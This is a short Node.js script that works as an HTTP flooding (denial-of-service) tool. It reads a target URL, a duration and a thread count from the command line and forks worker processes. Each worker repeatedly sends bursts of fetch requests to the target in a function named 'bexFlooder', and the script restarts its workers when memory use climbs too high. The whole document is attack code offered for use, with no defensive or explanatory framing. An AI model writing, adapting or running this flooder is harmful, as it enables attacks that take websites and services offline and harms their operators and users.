const os = require('os');
const cluster = require('cluster');
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    threads: ~~process.argv[4],
};
if (cluster.isMaster) {
	const restartScript = () => {
		for (const id in cluster.workers) {
			cluster.workers[id].kill();
		}
		console.log('[>] Restarting Script...');
		setTimeout(() => {
			for (let counter = 1; counter <= args.threads; counter++) {
				cluster.fork();
			}
		}, 1000);
	};
	const handleRAMUsage = () => {
		const totalRAM = os.totalmem();
		const usedRAM = totalRAM - os.freemem();
		const ramPercentage = (usedRAM / totalRAM) * 100;
		if (ramPercentage >= 80) {
			console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
			restartScript();
		}
	};
	setInterval(handleRAMUsage, 5000);
	for (let counter = 1; counter <= args.threads; counter++) {
		cluster.fork();
	}
	setTimeout(() => {
		process.exit(1);
	}, args.time * 1000);

} else {
	setInterval(bexFlooder);
}
function bexFlooder() {
const IntervalAttack = setInterval(() => {
for (let i = 0; i < 50; i++) {
    fetch(args.target).catch(error => {});
  }
 }, 1000);
}
